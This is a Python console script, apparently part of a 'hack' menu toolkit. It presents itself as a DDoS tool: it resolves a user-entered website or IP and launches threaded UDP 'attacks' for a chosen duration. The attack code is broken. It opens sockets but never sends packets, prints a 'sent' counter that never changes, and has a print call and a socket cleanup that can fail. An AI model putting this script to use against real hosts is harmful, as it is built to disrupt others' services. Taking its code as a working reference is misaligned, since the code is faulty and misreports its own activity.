import os
import sys
import random 
import time
import json
import requests
import threading
import subprocess
import urllib
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from pystyle import Write, Colors
import glob
import shutil
import socket


file_path = os.path.join("data", "setted.txt")

with open(file_path, 'r') as file:
            # Read the file line by line
            for line in file:
                # Strip any leading/trailing whitespace characters and split by '='
                if line.startswith("username="):
                    username = line.strip().split('=')[1]
                elif line.startswith("password="):
                    password = line.strip().split('=')[1]

def load_settings():
    """Loads settings from the settings file."""
    settings = {'username': 'User', 'password': ''}  # Default values
    try:
        with open(file_path, 'r') as file:
            for line in file:
                key, value = line.strip().split('=', 1)
                settings[key] = value
    except FileNotFoundError:
        os.system("python data/setting/set.py")
    return settings

input_folder = os.path.join("data/input")
output_folder = os.path.join("data/output")
cache_folder = os.path.join("data/cache")
file_path = os.path.join("data", "setted.txt")

def ddos(target_ip: str, target_port: int, duration: int = 60):
    timeout = time.time() + duration
    sent = 0
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (target_ip, target_port)
                
            Write.Print(f"| {username} | >> Sent {sent} threads to {target_ip}:{target_port}", Colors.black_to_red)
            
        except Exception as e:
            print(f"| {username} | >> Error: {e}", Colors.black_to_red)
        finally:
            s.close()

def start_ddos_test(target_ip: str, target_port: int, threads: int = 5, duration: int = 60):
    thread_list = []
    
    for _ in range(threads):
        thread = threading.Thread(
            target=ddos,
            args=(target_ip, target_port, duration)
        )
        thread_list.append(thread)
        thread.start()
    
    for thread in thread_list:
        thread.join()

def resolve_url(url):
    # Add http:// if not present
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    if url == 'http://127.0.0.1:5000':
        return '127.0.0.1', 5000

    
    parsed = urlparse(url)
    hostname = parsed.netloc
    try:
        # Get IP address from hostname
        ip = socket.gethostbyname(hostname)
        # Use default port 80 for HTTP if not specified
        port = parsed.port or 80
        return ip, port
    except socket.gaierror:
        Write.Print(f"| {username} | >> Invalid URL or cannot resolve hostname", Colors.black_to_red)
        return None, None

def main():
    Write.Print('''
 ______    ______    _______  _______ 
|   _  \  |   _  \  |   _   ||   _   |
|.  |   \ |.  |    \|.  |   ||   1___|
|.  |    \|.  |    \|.  |   ||____   |
|:  1    /|:  1    /|:  1   ||:  1   |
|::.. . / |::.. . / |::.. . ||::.. . |
`------'  `------'  `-------'`-------'
                                      
''', Colors.black_to_red, interval=0.001)
    Write.Print(f"| {username} | >> Enter website address or IP (e.g. example.com or 192.168.1.1): ", Colors.black_to_red)
    target = input()
    
    # Check if input is IP address
    try:
        socket.inet_aton(target)
        target_ip = target
        target_port = 80  # Default port for IP
    except socket.error:
        # If not IP, treat as URL
        target_ip, target_port = resolve_url(target)
        
    if not target_ip:
        time.sleep(2)
        os.system("cls")
        os.system("python data/hack/hack.py")
        return

    Write.Print(f"\n| {username} | >> Number of Threads: ", Colors.black_to_red)
    threads = int(input())
    Write.Print(f"\n| {username} | >> Duration in seconds: ", Colors.black_to_red)
    duration = int(input())
    
    Write.Print(f"\n| {username} | >> Starting ddos..", Colors.black_to_red)
    Write.Print(f"\nTarget: {target} ({target_ip}:{target_port})", Colors.black_to_red)
    Write.Print(f"\nThreads: {threads}", Colors.black_to_red)
    Write.Print(f"\nDuration: {duration} seconds\n", Colors.black_to_red)
    
    start_ddos_test(target_ip, target_port, threads, duration)
    Write.Print(f"\n| {username} | >> The attack is finished.", Colors.black_to_red)
    time.sleep(1.5)
    os.system("cls")
    os.system("python data/hack/hack.py")

if __name__ == "__main__":
    main()
